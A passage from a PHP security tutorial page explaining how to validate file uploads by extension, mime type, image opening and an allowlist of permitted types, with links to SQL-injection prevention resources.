<span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span>  <span class="token operator">?</span> <span class="token variable">$pathinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file is missing an extension or name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre></div><p>While now we have a filename and extension that can be used for storing, I still prefer storing that information in a database and give that file a generated name of for example, <code>md5(uniqid().microtime())</code></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>
<span class="token operator">|</span> <span class="token class-name">id</span> <span class="token operator">|</span> <span class="token class-name">title</span>  <span class="token operator">|</span> <span class="token class-name">extension</span> <span class="token operator">|</span> <span class="token class-name">mime</span>       <span class="token operator">|</span> <span class="token class-name">size</span> <span class="token operator">|</span> <span class="token class-name">filename</span>                         <span class="token operator">|</span> <span class="token class-name">time</span>                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>
<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> <span class="token class-name">myfile</span> <span class="token operator">|</span> <span class="token class-name">txt</span>       <span class="token operator">|</span> <span class="token class-name">text</span><span class="token operator">/</span><span class="token class-name">plain</span> <span class="token operator">|</span> <span class="token number">1020</span> <span class="token operator">|</span> <span class="token number">5</span>bcdaeddbfbd2810fa1b6f3118804d66 <span class="token operator">|</span> <span class="token number">2017</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">11</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">38</span><span class="token punctuation">:</span><span class="token number">54</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>

</code></pre></div><p>This would resolve the issue of duplicate file names and unforseen exploits in the file name. It would also cause the attacker to guess where that file has been stored as he or she cannot specifically target it for execution.</p> <h3 id="mime-type-validation"><a href="#mime-type-validation" class="header-anchor">#</a> Mime-type validation</h3> <p>Checking a file extension to determine what file it is is not enough as a file may named <code>image.png</code> but may very well contain a php script. By checking the mime-type of the uploaded file against a file extension you can verify if the file contains what its name is referring to.</p> <p>You can even go 1 step further for validating images, and that is actually opening them:</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mime</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$extension</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpeg'</span> <span class="token operator">||</span> <span class="token variable">$extension</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image failed to open, could be corrupt or the file contains something else.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre></div><p>You can fetch the mime-type using a build-in <a href="http://php.net/manual/en/function.mime-content-type.php" target="_blank" rel="noopener noreferrer">function<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> or a <a href="http://php.net/manual/en/book.fileinfo.php" target="_blank" rel="noopener noreferrer">class<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>.</p> <h3 id="white-listing-your-uploads"><a href="#white-listing-your-uploads" class="header-anchor">#</a> White listing your uploads</h3> <p>Most importantly, you should whitelist file extensions and mime types depending on each form.</p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">isFiletypeAllowed</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$mime</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$allowed</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span>  <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$allowed</span><span class="token punctuation">[</span><span class="token variable">$mime</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$allowed</span><span class="token punctuation">[</span><span class="token variable">$mime</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed</span><span class="token punctuation">[</span><span class="token variable">$mime</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$allowedFiletypes</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'image/png'</span>  <span class="token operator">=&gt;</span> <span class="token punctuation">[</span> <span class="token string single-quoted-string">'png'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/gif'</span>  <span class="token operator">=&gt;</span> <span class="token punctuation">[</span> <span class="token string single-quoted-string">'gif'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isFiletypeAllowed</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token variable">$allowedFiletypes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre></div><h4 id="remarks"><a href="#remarks" class="header-anchor">#</a> Remarks</h4> <p><strong>See Also</strong></p> <ul><li><a href="http://stackoverflow.com/documentation/php/5828/pdo/2685/preventing-sql-injection-with-parameterized-queries#t=201704202058314626537" target="_blank" rel="noopener noreferrer">Preventing SQL Injection with Parameterized Queries in PDO<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="http://stackoverflow.com/documentation/php/2784/php-mysqli/11958/prepared-statements-in-mysqli#t=201704202104063734533" target="_blank" rel="noopener noreferrer">Prepared Statements in mysqli<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://www.owasp.org/index.php/Main_Page" target="_blank" rel="noopener noreferrer">Open Web Application Security Project (OWASP)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/devtut/generate/edit/master/docs/php/security.md" target="_blank" rel="noopener noreferrer">Edit this page on GitHub</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/php/secure-remeber-me.html" class="prev">
        Secure Remeber Me
      </a></span> <span class="next"><a href="/php/cryptography.html">
        Cryptography
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----></div></div>
    <script src="/assets/js/app.1779e102.js" defer></script><script src="/assets/js/3.2cfa8016.js" defer></script><script src="/assets/js/2503.2291e032.js" defer></script>
  </body>
</html>
